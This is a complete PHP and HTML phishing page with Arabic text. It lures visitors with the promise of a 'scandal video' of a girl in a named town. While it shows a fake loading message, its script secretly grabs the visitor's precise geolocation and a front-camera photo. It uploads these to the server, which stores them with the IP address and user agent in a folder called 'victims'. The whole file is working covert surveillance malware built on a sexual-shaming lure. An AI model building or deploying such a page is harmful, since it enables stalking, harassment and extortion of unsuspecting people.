<?php
// ==== الحفظ الفوري في مجلد victims ====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip   = $_SERVER['REMOTE_ADDR'];
    $ua   = $_SERVER['HTTP_USER_AGENT'];
    $time = date("Y-m-d_H-i-s");

    if (!is_dir("victims")) mkdir("victims", 0777, true);

    // حفظ الصورة
    if (!empty($_POST['image'])) {
        $img = preg_replace('#^data:image/\w+;base64,#i', '', $_POST['image']);
        $img = str_replace(' ', '+', $img);
        $data = base64_decode($img);
        file_put_contents("victims/{$time}_{$ip}_cam.png", $data);
    }

    // حفظ الموقع
    $lat = $_POST['lat'] ?? "غير معروف";
    $lon = $_POST['lon'] ?? "غير معروف";
    file_put_contents("victims/{$time}_{$ip}_info.txt",
        "IP: $ip\nLAT: $lat\nLON: $lon\nTIME: $time\nUA: $ua");

    echo "تم ✓";
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مشاهدة فيديو فضيحة بنت في مدينة التل</title>
    <style>
        body {font-family:Arial;text-align:center;padding:50px;background:#111;color:#0f0;font-size:22px}
        h1 {font-size:32px}
        #video, #canvas {display:none}
    </style>
</head>
<body>
    <h1>جاري تحميل الفيديو في الخلفية...</h1>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
    window.onload = function() {
        // الموقع
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => sendData("lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude),
                () => sendData("location_error=1"),
                {enableHighAccuracy: true, maximumAge: 0, timeout: 15000}
            );
        }

        // الكاميرا الأمامية
        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
        .then(stream => {
            let video = document.getElementById('video');
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                let canvas = document.getElementById('canvas');
                canvas.width = 1280;
                canvas.height = 720;
                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                let img = canvas.toDataURL('image/png');
                sendData("image=" + encodeURIComponent(img));
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        })
        .catch(() => sendData("camera_error=1"));
    };

    function sendData(data) {
        let xhr = new XMLHttpRequest();
        xhr.open("POST", "", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(data);
    }
    </script>
</body>
</html>